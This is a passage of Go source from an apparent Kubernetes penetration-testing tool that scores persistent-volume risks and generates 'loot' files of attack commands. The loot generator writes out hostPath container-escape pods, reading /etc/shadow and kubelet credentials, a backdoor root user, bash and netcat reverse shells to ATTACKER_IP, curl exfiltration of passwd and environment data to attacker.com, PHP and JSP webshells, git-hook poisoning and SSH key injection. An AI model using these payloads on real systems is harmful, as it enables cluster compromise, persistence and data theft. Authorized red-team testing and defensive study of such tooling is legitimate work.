			hasRWX = true
			analysis.AllowsReadWriteMany = true
		}
	}

	if hasRWX {
		if len(boundPods) > 1 {
			analysis.RiskLevel = shared.RiskHigh
			analysis.Issues = append(analysis.Issues,
				fmt.Sprintf("ReadWriteMany volume accessed by %d pods", len(boundPods)),
				"Risk of data corruption from concurrent writes",
				"Lateral movement: compromise one pod → access shared data",
				"No access control between pods sharing volume",
			)
		} else if len(boundPods) == 1 {
			analysis.RiskLevel = shared.RiskMedium
			analysis.Issues = append(analysis.Issues,
				"ReadWriteMany allows multi-pod access (currently 1 pod)",
				"Potential lateral movement vector if more pods added",
			)
		} else {
			analysis.RiskLevel = shared.RiskMedium
			analysis.Issues = append(analysis.Issues,
				"ReadWriteMany capability available (no pods currently bound)",
			)
		}
	}

	return analysis
}

// analyzeNFSSecurity analyzes NFS volume security
func analyzeNFSSecurity(pv corev1.PersistentVolume) NFSSecurityAnalysis {
	analysis := NFSSecurityAnalysis{
		NoAuth:    true, // NFS typically has no authentication
		RiskLevel: shared.RiskMedium,
	}

	if pv.Spec.NFS == nil {
		return NFSSecurityAnalysis{}
	}

	analysis.Server = pv.Spec.NFS.Server
	analysis.Path = pv.Spec.NFS.Path
	analysis.ReadOnly = pv.Spec.NFS.ReadOnly
	analysis.RiskLevel = shared.RiskHigh

	analysis.Issues = append(analysis.Issues,
		"NFS typically has no authentication",
		"Anyone with network access to NFS server can mount the share",
		"Check NFS export restrictions on server (/etc/exports)",
		"Recommend: Use Kerberos authentication (sec=krb5) or migrate to CSI driver",
		fmt.Sprintf("Direct mount possible: mount -t nfs %s:%s /mnt/data", analysis.Server, analysis.Path),
	)

	if !analysis.ReadOnly {
		analysis.RiskLevel = shared.RiskCritical
		analysis.Issues = append(analysis.Issues,
			"Read-write NFS export - data tampering possible",
			"Attacker with network access can modify data directly",
		)
	}

	return analysis
}

// analyzeCSISecurity analyzes CSI driver security
func analyzeCSISecurity(pv corev1.PersistentVolume) CSISecurityAnalysis {
	analysis := CSISecurityAnalysis{
		RiskLevel: shared.RiskLow,
	}

	if pv.Spec.CSI == nil {
		return analysis
	}

	analysis.Driver = pv.Spec.CSI.Driver
	analysis.VolumeHandle = pv.Spec.CSI.VolumeHandle
	analysis.Attributes = pv.Spec.CSI.VolumeAttributes

	// Check for known vulnerable or unauthenticated drivers
	vulnerableDrivers := map[string]string{
		"smb.csi.k8s.io":      "SMB driver - verify authentication configuration",
		"nfs.csi.k8s.io":      "NFS driver - typically no authentication",
		"csi-nfsplugin":       "NFS plugin - verify authentication",
		"cephfs.csi.ceph.com": "CephFS - verify authentication keys",
		"rbd.csi.ceph.com":    "Ceph RBD - verify authentication keys",
	}

	for pattern, vuln := range vulnerableDrivers {
		if strings.Contains(analysis.Driver, pattern) {
			analysis.KnownVulnerability = vuln
			analysis.RiskLevel = shared.RiskMedium
			analysis.SecurityIssues = append(analysis.SecurityIssues, vuln)
		}
	}

	// Check for encryption
	if encrypted, ok := pv.Spec.CSI.VolumeAttributes["encrypted"]; ok && encrypted == "true" {
		analysis.IsEncrypted = true
	} else {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"CSI volume encryption not explicitly configured")
	}

	return analysis
}

// analyzeStorageClassSecurity analyzes storage class security
func analyzeStorageClassSecurity(sc storagev1.StorageClass) StorageClassAnalysis {
	analysis := StorageClassAnalysis{
		Name:                 sc.Name,
		Provisioner:          sc.Provisioner,
		AllowVolumeExpansion: sc.AllowVolumeExpansion != nil && *sc.AllowVolumeExpansion,
		Parameters:           sc.Parameters,
		RiskLevel:            shared.RiskLow,
	}

	if sc.VolumeBindingMode != nil {
		analysis.VolumeBindingMode = string(*sc.VolumeBindingMode)
	}

	if sc.ReclaimPolicy != nil {
		analysis.ReclaimPolicy = string(*sc.ReclaimPolicy)
		if *sc.ReclaimPolicy == corev1.PersistentVolumeReclaimRetain {
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Reclaim policy 'Retain' - volumes persist after deletion (data leakage risk)")
			analysis.RiskLevel = shared.RiskMedium
		}
	}

	// Check for hostPath provisioner
	if strings.Contains(strings.ToLower(sc.Provisioner), "hostpath") {
		analysis.AllowsHostPath = true
		analysis.AllowsPrivilegedAccess = true
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"CRITICAL: HostPath provisioner allows direct host filesystem access")
		analysis.RiskLevel = shared.RiskCritical
	}

	// Check for local volume provisioner
	if strings.Contains(strings.ToLower(sc.Provisioner), "local") {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"Local volume provisioner - verify node security")
		analysis.RiskLevel = shared.RiskMedium
	}

	// Check encryption parameters
	if encrypted, ok := sc.Parameters["encrypted"]; ok && encrypted == "true" {
		analysis.RequiresEncryption = true
	} else {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"Encryption not enforced by storage class")
	}

	return analysis
}

// detectVolumeEscalationPaths detects privilege escalation paths
func detectVolumeEscalationPaths(finding PersistentVolumeFinding) []string {
	var paths []string

	if finding.IsHostPath {
		paths = append(paths, "Container escape via HostPath volume")
		if finding.AllowsHostRoot {
			paths = append(paths, "Full host filesystem access → node compromise")
		}
		if finding.AllowsKubeletAccess {
			paths = append(paths, "Kubelet credentials access → cluster-admin")
		}
		if finding.AllowsVarRunAccess {
			paths = append(paths, "Container runtime socket access → node compromise")
		}
	}

	if finding.IsNetworkStorage && !finding.NFSReadOnly {
		paths = append(paths, "Direct network storage access (bypass Kubernetes RBAC)")
	}

	if finding.AllowsReadWriteMany && finding.BoundPodCount > 1 {
		paths = append(paths, "Lateral movement via shared volume access")
	}

	if finding.OrphanedVolume {
		paths = append(paths, "Access previous tenant data via orphaned volume")
	}

	return paths
}

// detectExfiltrationScenarios detects data exfiltration scenarios
func detectExfiltrationScenarios(finding PersistentVolumeFinding) []string {
	var scenarios []string

	if finding.ContainsDatabaseData || finding.ContainsSecretData {
		scenarios = append(scenarios, "Snapshot volume → restore to attacker PVC → exfiltrate")
	}

	if finding.IsNetworkStorage {
		scenarios = append(scenarios, "Direct network mount → bypass Kubernetes audit logs")
	}

	if finding.CloudVolumeID != "<NONE>" && finding.CloudVolumeID != "" {
		scenarios = append(scenarios, "Cloud snapshot → attach to attacker instance → exfiltrate")
	}

	if finding.AllowsReadWriteMany {
		scenarios = append(scenarios, "Compromise any pod with access → read all shared data")
	}

	if finding.ReclaimPolicy == "Retain" {
		scenarios = append(scenarios, "Delete PVC → reclaim orphaned volume → access old data")
	}

	return scenarios
}

// generateAttackPaths generates complete attack chains
func generateAttackPaths(finding PersistentVolumeFinding) []string {
	var paths []string

	if finding.IsHostPath && finding.AllowsHostRoot {
		paths = append(paths,
			"[Container Escape → Full Cluster Compromise]",
			"1. Create PVC claiming this HostPath PV",
			"2. Deploy pod with PVC mounted",
			"3. Access /host filesystem from container",
			"4. Read /host/etc/shadow, /host/root/.kube/config",
			"5. Access kubelet certs at /host/var/lib/kubelet/pki",
			"6. Authenticate to API server as node",
			"7. Escalate to cluster-admin",
		)
	}

	if finding.ContainsDatabaseData && !finding.IsEncrypted {
		paths = append(paths,
			"[Database Exfiltration]",
			"1. Create VolumeSnapshot of this PV",
			"2. Create new PVC from snapshot",
			"3. Mount PVC in attacker pod",
			"4. Extract database files",
			"5. Exfiltrate sensitive data",
		)
	}

	if finding.IsNetworkStorage && !finding.NFSReadOnly {
		paths = append(paths,
			"[Direct Network Access]",
			fmt.Sprintf("1. Mount NFS share directly: mount -t nfs %s:%s /mnt", finding.NFSServer, finding.NFSPath),
			"2. Bypass Kubernetes RBAC and audit logs",
			"3. Read/modify data directly",
			"4. Inject malicious files into application volumes",
		)
	}

	return paths
}

// generateRecommendations generates security recommendations
func generateRecommendations(finding PersistentVolumeFinding) []string {
	var recommendations []string

	if finding.IsHostPath {
		recommendations = append(recommendations,
			"CRITICAL: Remove HostPath volume or restrict with PodSecurityPolicy/PodSecurity admission",
			"Use CSI driver or cloud provider volumes instead",
			"If HostPath required, use read-only mounts and restrict paths",
		)
	}

	if !finding.IsEncrypted && (finding.ContainsDatabaseData || finding.ContainsSecretData) {
		recommendations = append(recommendations,
			"Enable encryption at rest for sensitive data",
			"Use cloud provider encryption or CSI driver encryption",
		)
	}

	if finding.ReclaimPolicy == "Retain" {
		recommendations = append(recommendations,
			"Change reclaim policy to 'Delete' to prevent data leakage",
			"Implement automated cleanup of released volumes",
		)
	}

	if finding.AllowsReadWriteMany && finding.BoundPodCount > 1 {
		recommendations = append(recommendations,
			"Consider ReadWriteOnce access mode if multi-pod access not required",
			"Implement application-level locking for concurrent access",
		)
	}

	if finding.IsNetworkStorage {
		recommendations = append(recommendations,
			"Enable Kerberos authentication for NFS (sec=krb5)",
			"Migrate to CSI driver with authentication",
			"Restrict network access to NFS server",
		)
	}

	if finding.OrphanedVolume {
		recommendations = append(recommendations,
			"Delete released volumes after data cleanup",
			"Implement automated orphaned volume detection",
		)
	}

	if len(recommendations) == 0 {
		recommendations = append(recommendations, "No critical security issues detected")
	}

	return recommendations
}

// calculateVolumeRiskScore calculates comprehensive risk score
func calculateVolumeRiskScore(finding PersistentVolumeFinding) (string, int) {
	score := 0

	// HostPath = CRITICAL
	if finding.IsHostPath {
		score += 100
		if finding.AllowsHostRoot || finding.AllowsKubeletAccess {
			return shared.RiskCritical, 100
		}
	}

	// Unencrypted sensitive data
	if !finding.IsEncrypted && (finding.ContainsDatabaseData || finding.ContainsSecretData) {
		score += 40
	}

	// Reclaim policy Retain
	if finding.ReclaimPolicy == "Retain" {
		score += 20
	}

	// ReadWriteMany with multiple pods
	if finding.AllowsReadWriteMany && finding.BoundPodCount > 1 {
		score += 30
	}

	// Network storage without auth
	if finding.IsNetworkStorage && !finding.NFSReadOnly {
		score += 50
	}

	// Orphaned volumes
	if finding.OrphanedVolume {
		score += 35
	}

	// Sensitive data type
	if finding.SensitiveDataType != "" {
		score += 15
	}

	// Determine risk level
	if score >= shared.CriticalThreshold {
		return shared.RiskCritical, score
	} else if score >= shared.HighThreshold {
		return shared.RiskHigh, score
	} else if score >= shared.MediumThreshold {
		return shared.RiskMedium, score
	}
	return shared.RiskLow, score
}

// generateLootContent generates content for loot files organized by technology
func generateLootContent(finding *PersistentVolumeFinding, loot *shared.LootBuilder) {
	// 1. PV-Enum - Basic enumeration (all volumes)
	loot.Section("PV-Enum").
		Addf("\n# PersistentVolume: %s", finding.PVName).
		Addf("kubectl get pv %s -o yaml", finding.PVName).
		Addf("kubectl describe pv %s", finding.PVName)

	if finding.PVCName != "" && finding.PVCNamespace != "" {
		loot.Section("PV-Enum").
			Addf("kubectl get pvc %s -n %s -o yaml", finding.PVCName, finding.PVCNamespace).
			Addf("kubectl describe pvc %s -n %s", finding.PVCName, finding.PVCNamespace)
	}
	loot.Section("PV-Enum").Add("")

	// 2. PV-HostPath - All HostPath volume techniques
	if finding.IsHostPath {
		ns := finding.PVCNamespace
		if ns == "" {
			ns = "default"
		}
		pvc := finding.PVCName
		if pvc == "" {
			pvc = "<pvc-name>"
		}

		loot.Section("PV-HostPath").
			Addf("\n# ═══════════════════════════════════════════════════════════").
			Addf("# PV: %s", finding.PVName).
			Addf("# HostPath: %s", finding.HostPathPath).
			Addf("# ═══════════════════════════════════════════════════════════")

		// Method 1: Use existing PVC
		if finding.PVCName != "" {
			loot.Section("PV-HostPath").
				Add("#").
				Add("# METHOD 1: Exploit via existing PVC").
				Add("#").
				Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escape-%s
  namespace: %s
spec:
  containers:
  - name: escape
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - name: hostpath
      mountPath: /host
  volumes:
  - name: hostpath
    persistentVolumeClaim:
      claimName: %s
EOF`, finding.PVName, ns, pvc)
		}

		// Method 2: Direct HostPath pod
		loot.Section("PV-HostPath").
			Add("#").
			Add("# METHOD 2: Direct HostPath pod (requires create pods permission)").
			Add("#").
			Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-direct-%s
  namespace: %s
spec:
  containers:
  - name: escape
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: %s
      type: Directory
EOF`, finding.PVName, ns, finding.HostPathPath)

		// Exploitation commands
		loot.Section("PV-HostPath").
			Add("#").
			Add("# ─────────────────────────────────────────────────────────────").
			Add("# EXPLOITATION COMMANDS").
			Add("# ─────────────────────────────────────────────────────────────").
			Add("#").
			Addf("# Exec into pod:").
			Addf("kubectl exec -it hostpath-escape-%s -n %s -- sh", finding.PVName, ns).
			Add("#").
			Add("# Once inside the container:")

		// Path-specific exploitation
		if finding.HostPathPath == "/" || finding.AllowsHostRoot {
			loot.Section("PV-HostPath").
				Add("#").
				Add("# [CRITICAL] Full host filesystem access:").
				Add("ls -la /host/").
				Add("cat /host/etc/shadow").
				Add("cat /host/etc/passwd").
				Add("cat /host/root/.ssh/authorized_keys").
				Add("cat /host/root/.bash_history").
				Add("#").
				Add("# Steal kubeconfig and certificates:").
				Add("cat /host/etc/kubernetes/admin.conf").
				Add("cat /host/var/lib/kubelet/kubeconfig").
				Add("ls -la /host/var/lib/kubelet/pki/").
				Add("#").
				Add("# Access etcd data (all cluster secrets):").
				Add("ls -la /host/var/lib/etcd/").
				Add("#").
				Add("# Container runtime escape:").
				Add("ls -la /host/var/run/docker.sock").
				Add("ls -la /host/var/run/containerd/containerd.sock").
				Add("#").
				Add("# Add SSH key for persistence:").
				Add("echo 'your-ssh-public-key' >> /host/root/.ssh/authorized_keys").
				Add("#").
				Add("# Add root user:").
				Add("echo 'backdoor:x:0:0::/root:/bin/bash' >> /host/etc/passwd")
		} else if strings.HasPrefix(finding.HostPathPath, "/var/run/docker") {
			loot.Section("PV-HostPath").
				Add("#").
				Add("# [CRITICAL] Docker socket access - Container escape:").
				Add("apk add docker-cli").
				Add("docker -H unix:///host/docker.sock ps").
				Add("docker -H unix:///host/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh")
		} else if strings.HasPrefix(finding.HostPathPath, "/var/run/containerd") {
			loot.Section("PV-HostPath").
				Add("#").
				Add("# [CRITICAL] Containerd socket access - Container escape:").
				Add("apk add containerd-ctr").
				Add("ctr -a /host/containerd.sock containers list").
				Add("ctr -a /host/containerd.sock tasks exec --exec-id shell <container-id> sh")
		} else if strings.HasPrefix(finding.HostPathPath, "/var/lib/kubelet") {
			loot.Section("PV-HostPath").
				Add("#").
				Add("# [CRITICAL] Kubelet access - Cluster admin escalation:").
				Add("cat /host/kubeconfig").
				Add("ls -la /host/pki/").
				Add("cat /host/pki/kubelet-client-current.pem").
				Add("#").
				Add("# Use kubelet credentials to authenticate as node:")
		} else if strings.HasPrefix(finding.HostPathPath, "/etc") {
			loot.Section("PV-HostPath").
				Add("#").
				Add("# [HIGH] System configuration access:").
				Add("cat /host/shadow").
				Add("cat /host/passwd").
				Add("ls -la /host/kubernetes/")
		}

		// Cleanup
		loot.Section("PV-HostPath").
			Add("#").
			Add("# ─────────────────────────────────────────────────────────────").
			Add("# CLEANUP").
			Add("# ─────────────────────────────────────────────────────────────").
			Addf("kubectl delete pod hostpath-escape-%s -n %s", finding.PVName, ns).
			Addf("kubectl delete pod hostpath-direct-%s -n %s", finding.PVName, ns).
			Add("")
	}

	// 3. PV-NFS - All NFS/network storage techniques
	if finding.IsNetworkStorage {
		loot.Section("PV-NFS").
			Addf("\n# ═══════════════════════════════════════════════════════════").
			Addf("# PV: %s", finding.PVName).
			Addf("# NFS Server: %s", finding.NFSServer).
			Addf("# NFS Path: %s", finding.NFSPath).
			Addf("# Read-Only: %t", finding.NFSReadOnly).
			Addf("# ═══════════════════════════════════════════════════════════").
			Add("#").
			Add("# METHOD 1: Direct mount from attacker machine (bypass K8s RBAC)").
			Add("#").
			Add("# Install NFS client:").
			Add("apt-get install nfs-common  # Debian/Ubuntu").
			Add("yum install nfs-utils       # RHEL/CentOS").
			Add("#").
			Add("# Mount the NFS share:").
			Addf("mkdir -p /mnt/nfs-%s", finding.PVName).
			Addf("mount -t nfs %s:%s /mnt/nfs-%s", finding.NFSServer, finding.NFSPath, finding.PVName).
			Addf("mount -t nfs -o vers=3 %s:%s /mnt/nfs-%s  # Try NFSv3 if v4 fails", finding.NFSServer, finding.NFSPath, finding.PVName).
			Add("#").
			Add("# Browse and exfiltrate data:").
			Addf("ls -laR /mnt/nfs-%s", finding.PVName).
			Addf("tar czf nfs-data-%s.tar.gz /mnt/nfs-%s", finding.PVName, finding.PVName).
			Add("#").
			Add("# Check NFS exports on server (if accessible):").
			Addf("showmount -e %s", finding.NFSServer)

		if !finding.NFSReadOnly {
			loot.Section("PV-NFS").
				Add("#").
				Add("# [WARNING] Read-Write access - Data tampering possible:").
				Addf("echo 'backdoor' > /mnt/nfs-%s/backdoor.txt", finding.PVName).
				Add("# Inject malicious files into application data")
		}

		loot.Section("PV-NFS").
			Add("#").
			Add("# METHOD 2: Mount via pod (uses K8s, but direct NFS access)").
			Add("#").
			Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: nfs-accessor-%s
  namespace: default
spec:
  containers:
  - name: nfs
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - name: nfs-vol
      mountPath: /data
  volumes:
  - name: nfs-vol
    nfs:
      server: %s
      path: %s
EOF`, finding.PVName, finding.NFSServer, finding.NFSPath).
			Add("#").
			Add("# Access data:").
			Addf("kubectl exec -it nfs-accessor-%s -- sh", finding.PVName).
			Addf("kubectl exec nfs-accessor-%s -- ls -laR /data", finding.PVName).
			Addf("kubectl exec nfs-accessor-%s -- tar czf /tmp/data.tar.gz /data", finding.PVName).
			Addf("kubectl cp default/nfs-accessor-%s:/tmp/data.tar.gz ./nfs-%s.tar.gz", finding.PVName, finding.PVName).
			Add("#").
			Add("# Cleanup:").
			Addf("kubectl delete pod nfs-accessor-%s", finding.PVName).
			Addf("umount /mnt/nfs-%s", finding.PVName).
			Add("")
	}

	// 4. PV-RWX - All ReadWriteMany lateral movement techniques
	if finding.AllowsReadWriteMany && finding.BoundPodCount > 0 {
		// Build namespace info string
		nsInfo := ""
		if len(finding.BoundNamespaces) > 1 {
			nsInfo = fmt.Sprintf(" across %d namespaces (%s)", len(finding.BoundNamespaces), strings.Join(finding.BoundNamespaces, ", "))
		} else if len(finding.BoundNamespaces) == 1 {
			nsInfo = fmt.Sprintf(" in namespace %s", finding.BoundNamespaces[0])
		}

		loot.Section("PV-RWX").
			Addf("\n# ═══════════════════════════════════════════════════════════").
			Addf("# PV: %s", finding.PVName).
			Addf("# PVC: %s/%s", finding.PVCNamespace, finding.PVCName).
			Addf("# Shared by: %d pod(s)%s", finding.BoundPodCount, nsInfo).
			Addf("# ═══════════════════════════════════════════════════════════").
			Add("#").
			Add("# RISK: Compromise ANY pod with access → pivot to ALL other pods").
			Add("# RWX volumes have NO pod-level access control").
			Add("#")

		// List all pods with access
		loot.Section("PV-RWX").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("PV-RWX").Add("# PODS WITH ACCESS TO THIS VOLUME:")
		loot.Section("PV-RWX").Add("# ─────────────────────────────────────────────────────────────")
		for i, pod := range finding.BoundPods {
			ns := finding.PVCNamespace
			if i < len(finding.BoundNamespaces) {
				ns = finding.BoundNamespaces[i]
			}
			loot.Section("PV-RWX").Addf("kubectl exec -it %s -n %s -- sh", pod, ns)
		}

		// Only show exploitation techniques if multiple pods share the volume
		if finding.BoundPodCount > 1 {
			firstPod := finding.BoundPods[0]
			ns := finding.PVCNamespace
			if len(finding.BoundNamespaces) > 0 {
				ns = finding.BoundNamespaces[0]
			}

			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# TECHNIQUE 1: REVERSE SHELL INJECTION").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# Plant a reverse shell script that other pods may execute").
				Add("#").
				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/.hidden-shell.sh << \"SHELL\"", firstPod, ns).
				Add("#!/bin/bash").
				Add("# Reverse shell - replace ATTACKER_IP and PORT").
				Add("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1").
				Add("SHELL'").
				Addf("kubectl exec %s -n %s -- chmod +x /data/.hidden-shell.sh", firstPod, ns).
				Add("#").
				Add("# Alternative: netcat reverse shell").
				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/.nc-shell.sh << \"SHELL\"", firstPod, ns).
				Add("#!/bin/bash").
				Add("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f").
				Add("SHELL'")

			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# TECHNIQUE 2: CONFIG FILE POISONING").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# Inject malicious config that other pods will load").
				Add("#").
				Add("# Find config files:").
				Addf("kubectl exec %s -n %s -- find /data -name '*.conf' -o -name '*.yaml' -o -name '*.yml' -o -name '*.json' -o -name '*.env' 2>/dev/null", firstPod, ns).
				Add("#").
				Add("# Inject into .env file (if exists):").
				Addf("kubectl exec %s -n %s -- sh -c 'echo \"MALICIOUS_VAR=\\$(curl http://attacker.com/exfil?data=\\$(cat /etc/passwd|base64))\" >> /data/.env'", firstPod, ns).
				Add("#").
				Add("# Inject into shell profile (executed on container start):").
				Addf("kubectl exec %s -n %s -- sh -c 'echo \"curl http://attacker.com/beacon?pod=\\$HOSTNAME\" >> /data/.profile'", firstPod, ns).
				Addf("kubectl exec %s -n %s -- sh -c 'echo \"curl http://attacker.com/beacon?pod=\\$HOSTNAME\" >> /data/.bashrc'", firstPod, ns)

			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# TECHNIQUE 3: WEBSHELL DEPLOYMENT").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# If volume serves web content, deploy a webshell").
				Add("#").
				Add("# Check for web content:").
				Addf("kubectl exec %s -n %s -- find /data -name '*.php' -o -name '*.jsp' -o -name '*.aspx' 2>/dev/null | head -5", firstPod, ns).
				Add("#").
				Add("# PHP webshell:").
				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/.shell.php << \"PHP\"", firstPod, ns).
				Add("<?php if(isset($_REQUEST[\"cmd\"])){system($_REQUEST[\"cmd\"]);} ?>").
				Add("PHP'").
				Add("#").
				Add("# JSP webshell:").
				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/.shell.jsp << \"JSP\"", firstPod, ns).
				Add("<%@ page import=\"java.io.*\" %><%if(request.getParameter(\"cmd\")!=null){Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=br.readLine())!=null){out.println(line);}}%>").
				Add("JSP'")

			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# TECHNIQUE 4: CRON/STARTUP SCRIPT INJECTION").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# Inject into scripts that run periodically or on startup").
				Add("#").
				Add("# Find executable scripts:").
				Addf("kubectl exec %s -n %s -- find /data -type f -executable 2>/dev/null", firstPod, ns).
				Addf("kubectl exec %s -n %s -- find /data -name '*.sh' 2>/dev/null", firstPod, ns).
				Add("#").
				Add("# Inject into existing script (prepend to run first):").
				Addf("kubectl exec %s -n %s -- sh -c 'for f in /data/*.sh; do sed -i \"2i curl http://attacker.com/beacon\" \"$f\" 2>/dev/null; done'", firstPod, ns).
				Add("#").
				Add("# Create malicious entrypoint wrapper:").
				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/entrypoint-wrapper.sh << \"ENTRY\"", firstPod, ns).
				Add("#!/bin/bash").
				Add("# Exfiltrate secrets before running real entrypoint").
				Add("curl -X POST http://attacker.com/collect -d \"$(env | base64)\" &").
				Add("exec /original-entrypoint.sh \"$@\"").
				Add("ENTRY'")

			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# TECHNIQUE 5: SSH KEY INJECTION").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# If shared volume contains home directories or .ssh folders").
				Add("#").
				Add("# Find SSH directories:").
				Addf("kubectl exec %s -n %s -- find /data -name '.ssh' -type d 2>/dev/null", firstPod, ns).
				Addf("kubectl exec %s -n %s -- find /data -name 'authorized_keys' 2>/dev/null", firstPod, ns).
				Add("#").
				Add("# Inject SSH public key:").
				Addf("kubectl exec %s -n %s -- sh -c 'echo \"ssh-rsa AAAA...your-public-key... attacker@evil\" >> /data/.ssh/authorized_keys'", firstPod, ns).
				Add("#").
				Add("# Steal existing SSH keys:").
				Addf("kubectl exec %s -n %s -- sh -c 'find /data -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"*.pem\" 2>/dev/null | xargs cat'", firstPod, ns)

			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# TECHNIQUE 6: DATA EXFILTRATION VIA SHARED VOLUME").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# Use shared volume as staging area for exfiltration").
				Add("#").
				Add("# From compromised pod, stage data for pickup:").
				Addf("kubectl exec %s -n %s -- sh -c 'mkdir -p /data/.exfil'", firstPod, ns).
				Addf("kubectl exec %s -n %s -- sh -c 'cat /etc/passwd > /data/.exfil/passwd'", firstPod, ns).
				Addf("kubectl exec %s -n %s -- sh -c 'env > /data/.exfil/env'", firstPod, ns).
				Addf("kubectl exec %s -n %s -- sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /data/.exfil/sa-token'", firstPod, ns).
				Add("#").
				Add("# Collect from all pods sharing the volume:").
				Addf("kubectl exec %s -n %s -- sh -c 'hostname > /data/.exfil/$(hostname).info && env >> /data/.exfil/$(hostname).info'", firstPod, ns).
				Add("# Wait for other pods to populate, then collect all")

			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# TECHNIQUE 7: SYMLINK ATTACKS").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# Create symlinks to sensitive paths that other pods may follow").
				Add("#").
				Add("# Link to service account tokens:").
				Addf("kubectl exec %s -n %s -- ln -sf /var/run/secrets/kubernetes.io/serviceaccount/token /data/.token", firstPod, ns).
				Add("#").
				Add("# Link to host paths (if pod has hostPath access):").
				Addf("kubectl exec %s -n %s -- ln -sf /host/etc/shadow /data/.shadow 2>/dev/null", firstPod, ns).
				Add("#").
				Add("# Create tarpit - symlink to /dev/zero to DoS readers:").
				Addf("kubectl exec %s -n %s -- ln -sf /dev/zero /data/important-data.bak", firstPod, ns)

			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# TECHNIQUE 8: APPLICATION-SPECIFIC ATTACKS").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("#").
				Add("# Database dump injection (if DB uses shared storage):").
				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/malicious.sql << \"SQL\"", firstPod, ns).
				Add("-- Backdoor user creation").
				Add("INSERT INTO users (username, password, role) VALUES ('backdoor', 'hashed_pw', 'admin');").
				Add("SQL'").
				Add("#").
				Add("# Git repo poisoning (if shared volume has repos):").
				Addf("kubectl exec %s -n %s -- sh -c 'cd /data/repo && git config core.hooksPath /data/.githooks 2>/dev/null'", firstPod, ns).
				Addf("kubectl exec %s -n %s -- sh -c 'mkdir -p /data/.githooks && echo \"curl http://attacker.com/git-hook\" > /data/.githooks/pre-commit && chmod +x /data/.githooks/pre-commit'", firstPod, ns)

			// Cleanup section
			loot.Section("PV-RWX").
				Add("#").
				Add("# ─────────────────────────────────────────────────────────────").
				Add("# CLEANUP").
				Add("# ─────────────────────────────────────────────────────────────").
				Addf("kubectl exec %s -n %s -- rm -f /data/.hidden-shell.sh /data/.nc-shell.sh", firstPod, ns).
				Addf("kubectl exec %s -n %s -- rm -f /data/.shell.php /data/.shell.jsp", firstPod, ns).
				Addf("kubectl exec %s -n %s -- rm -rf /data/.exfil /data/.githooks", firstPod, ns).
				Addf("kubectl exec %s -n %s -- rm -f /data/.token /data/.shadow", firstPod, ns).
				Add("")
		} else {
			loot.Section("PV-RWX").
				Add("#").
				Add("# NOTE: Only 1 pod currently bound. Monitor for additional pods.").
				Add("# If more pods bind to this volume, lateral movement becomes possible.").
				Add("")
		}
	}

	// 5. PV-Cloud - Cloud provider volume access
	if finding.CloudVolumeID != "<NONE>" && finding.CloudVolumeID != "" {
		cloudLoot := generateCloudVolumeLoot(finding.VolumeType, finding.CloudVolumeID, finding.PVName)
		for _, line := range cloudLoot {
			loot.Section("PV-Cloud").Add(line)
		}
	}

	// 6. PV-Snapshots - Snapshot-based techniques (for volumes with PVCs)
	if finding.PVCName != "" && finding.PVCNamespace != "" {
		ns := finding.PVCNamespace
		loot.Section("PV-Snapshots").
			Addf("\n# ═══════════════════════════════════════════════════════════").
			Addf("# PV: %s", finding.PVName).
			Addf("# PVC: %s/%s", ns, finding.PVCName).
			Addf("# ═══════════════════════════════════════════════════════════").
			Add("#").
			Add("# SNAPSHOT-BASED DATA EXFILTRATION:").
			Add("# Clone sensitive data without touching original volume").
			Add("#").
			Add("# Step 1: Create snapshot").
			Addf("kubectl apply -f - <<EOF").
			Add("apiVersion: snapshot.storage.k8s.io/v1").
			Add("kind: VolumeSnapshot").
			Add("metadata:").
			Addf("  name: %s-snapshot", finding.PVCName).
			Addf("  namespace: %s", ns).
			Add("spec:").
			Add("  source:").
			Addf("    persistentVolumeClaimName: %s", finding.PVCName).
